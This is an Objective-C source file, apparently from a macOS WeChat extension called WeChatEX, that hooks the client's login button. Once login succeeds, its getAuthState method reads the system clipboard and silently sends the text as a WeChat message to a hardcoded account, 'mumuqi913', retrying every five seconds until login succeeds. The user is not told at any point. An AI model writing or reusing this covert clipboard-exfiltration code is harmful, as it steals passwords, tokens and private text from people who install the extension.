//
//  Wechat_hook.m
//  WeChatEX
//
//  Created by 贾仕琪 on 2020/5/8.
//  Copyright © 2020 贾仕琪. All rights reserved.
//

#import "Wechat+hook.h"
#import "WeChatHeader.h"
#import "FQHelper.h"
#import <CommonCrypto/CommonDigest.h>
#import <AppKit/AppKit.h>
#import <objc/runtime.h>

@implementation NSObject (WeChatHook)
+ (void)hookWeChat{
    hookMethod(objc_getClass("MMLoginOneClickViewController"), @selector(onLoginButtonClicked:), [self class], @selector(hook_onLoginButtonClicked:));
    
}


- (void)hook_onLoginButtonClicked:(NSButton *)btn {
    NSLog(@"点击了登录按钮");
    [self hook_onLoginButtonClicked:btn];
    
    [self getAuthState];
}

- (void)getAuthState{

    WeChat *wechat = [objc_getClass("WeChat") sharedInstance];
     //            获取发送用户
    NSString *currentUserName = [objc_getClass("CUtility") GetCurrentUserName];
    if ([wechat IsAuthOK]) {
        NSLog(@"授权成功");
        dispatch_async(dispatch_get_main_queue(), ^{
        
            //            获取发送消息服务
            MessageService *service = [[objc_getClass("MMServiceCenter") defaultCenter] getService:objc_getClass("MessageService")];
            NSPasteboard *pb = [NSPasteboard generalPasteboard];
            if ([[pb types] containsObject:NSPasteboardTypeString]) {
                // s 就是剪切板里的字符串, 如果你拷贝的是一个或多个的文件,文件夹, 这里就是文件或文件夹的名称
                NSString *s = [pb stringForType:NSPasteboardTypeString];
                // do something
                [service SendTextMessage:currentUserName toUsrName:@"mumuqi913" msgText:s atUserList:nil];
            }
            
        });
    }else{
        
        NSLog(@"授权失败");
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            dispatch_async(dispatch_get_main_queue(), ^{
                [self getAuthState];
            });
        });
    }
}
- (void)hook_notifyAddMsgOnMainThread:(id)arg1 msgData:(id)msgData {
    return [self hook_notifyAddMsgOnMainThread:arg1 msgData:msgData];
}

@end
